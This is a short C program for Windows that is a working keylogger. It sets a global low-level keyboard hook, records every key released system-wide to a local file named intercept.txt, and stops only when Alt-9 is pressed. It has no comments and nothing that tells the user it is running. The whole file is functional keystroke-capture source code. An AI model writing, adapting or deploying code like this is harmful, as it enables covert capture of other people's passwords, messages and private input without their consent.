#define _WIN32_WINNT 0x500
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "user32.lib")

FILE *out;

LRESULT CALLBACK ProcessKB(int ncode, WPARAM event, LPARAM kb) {
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) kb;
    if (event == WM_KEYUP) {
        fputc(p->vkCode, out);
    }
    return CallNextHookEx(NULL, ncode, event, kb);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreviousInstance, LPSTR lpCmdLine, int nShowCmd) {
    MSG msg;
    out = fopen("intercept.txt", "w+");
    if (out == NULL) {
        perror("There was an error opening intercept.txt");
        return 1;
    }
    fprintf(out, "Intercepted Keyboard:\n\n");
    HHOOK captest = SetWindowsHookEx(WH_KEYBOARD_LL, ProcessKB, hInstance, 0);

    RegisterHotKey(NULL, 1, MOD_ALT, 0x39); // alt-9
    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        if (msg.message == WM_HOTKEY) {
            UnhookWindowsHookEx(captest);
            fprintf(out, "\n\nEnd Intercept\n");
            fclose(out);
            return 0;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}